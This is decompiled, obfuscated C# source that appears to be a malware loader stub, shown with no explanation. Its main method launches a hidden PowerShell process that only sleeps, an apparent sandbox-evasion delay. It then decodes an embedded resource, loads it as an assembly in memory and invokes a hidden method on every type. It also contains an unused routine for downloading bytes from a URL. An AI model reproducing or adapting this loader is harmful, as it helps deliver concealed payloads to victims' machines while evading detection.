using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using Gxyizcn.Properties;

internal class sgr
{
	private byte[] tfp()
	{
		byte[] aco = Resources.aco;
		aco.son();
		return aco;
	}

	private byte[] tfq(string lxr)
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(lxr);
		MemoryStream lxr2 = new MemoryStream();
		using HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		using Stream stream = httpWebResponse.GetResponseStream();
		byte[] array = new byte[10204];
		int num = 0;
		do
		{
			num = stream.Read(array, 0, array.Length);
			tfr(ref lxr2, array, num);
		}
		while (num > 0);
		return lxr2.ToArray();
	}

	private void tfr(ref MemoryStream lxr, byte[] lxs, int lxt)
	{
		lxr.Write(lxs, 0, lxt);
	}

	private Assembly tfs()
	{
		return Thread.GetDomain().Load(tfp());
	}

	internal string tft()
	{
		string empty = string.Empty;
		Process process = new Process();
		process.StartInfo.FileName = "powershell";
		process.StartInfo.Arguments = "Start-Sleep -Seconds 10;Start-Sleep -Seconds 10;";
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.Start();
		empty = process.StandardOutput.ReadToEnd();
		Assembly assembly = tfs();
		Type[] types = assembly.GetTypes();
		for (int i = 0; i < types.Length; i++)
		{
			try
			{
				empty += (string)types[i].InvokeMember("Iaccclvyqewidn", BindingFlags.InvokeMethod, null, null, null);
			}
			catch
			{
			}
		}
		return empty;
	}
}
